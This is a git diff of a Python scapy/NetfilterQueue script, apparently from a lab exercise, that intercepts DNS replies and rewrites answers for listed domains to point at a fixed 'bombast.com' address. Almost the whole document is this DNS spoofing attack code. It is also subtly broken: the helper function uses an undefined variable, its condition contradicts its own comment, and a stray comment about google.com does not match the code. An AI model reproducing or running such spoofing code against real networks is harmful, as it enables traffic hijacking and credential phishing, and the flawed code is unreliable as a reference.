@@ -1,27 +1,61 @@
 #! /usr/bin/env python2.7
 
-# Author: byt3bl33d3r
-# Created: 10 March, 2015
+# Sources: byt3bl33d3r, Abdou Rockikz
 
-# Modified 19 November, 2019 by William Lucca
-
-from scapy.all import DNS, IP, sr1, UDP
+from scapy.all import *
 from netfilterqueue import NetfilterQueue
+
+BOMBAST_ADDR = '10.4.18.2'  # bombast.com
+ISP_DOMAINS = ['atb.com']  # ISPs to change if in reply
 
 def modify(packet):
     # Convert the raw packet to a scapy compatible string
-    pkt = IP(packet.get_payload())
+    scapy_pkt = IP(packet.get_payload())
 
-    # TODO
-    # Modify the packet all you want here
-    print(str(pkt))
+    # Modify packet payload
+    if scapy_pkt.haslayer(DNSRR):
+        # If the packet is a DNS Resource Record (DNS reply)
+        # Modify the packet
+        print("[Before]:", scapy_pkt.summary())
+        try:
+            scapy_pkt = changeToBombast(scapy_pkt)
+        except IndexError:
+            # Not UDP packet, this can be IPerror/UDPerror packets
+            pass
+        print("[After]: ", scapy_pkt.summary())
 
-    # Set the packet content to our modified version
-    packet.set_payload(str(pkt))
+        # Set the packet content to our modified version
+        packet.set_payload(bytes(scapy_pkt))
 
     # Accept the packet
     packet.accept()
 
+# Changes the answer portion of the given packet from other ISP addr
+# to bombast addr if one is found
+def changeToBombast(scapy_pkt):
+    # Get the DNS question name, the domain name
+    qname = packet[DNSQR].qname
+    if qname not in ISP_DOMAINS:
+        # Don't modify if the question is an ISP domain
+        print("no modification:", qname)
+        return packet
+
+    # Craft new answer, overriding the original
+    # Setting the rdata for the IP we want to redirect (spoofed)
+    # for instance, google.com will be mapped to "192.168.1.100"
+    packet[DNS].an = DNSRR(rrname=qname, rdata=BOMBAST_ADDR)
+    # Set the answer count to 1
+    packet[DNS].ancount = 1
+
+    # Delete checksums and length of packet, because we have modified the packet
+    # New calculations are required (scapy will do automatically)
+    del packet[IP].len
+    del packet[IP].chksum
+    del packet[UDP].len
+    del packet[UDP].chksum
+
+    # Return the modified packet
+    return packet
 
 nfqueue = NetfilterQueue()  
 
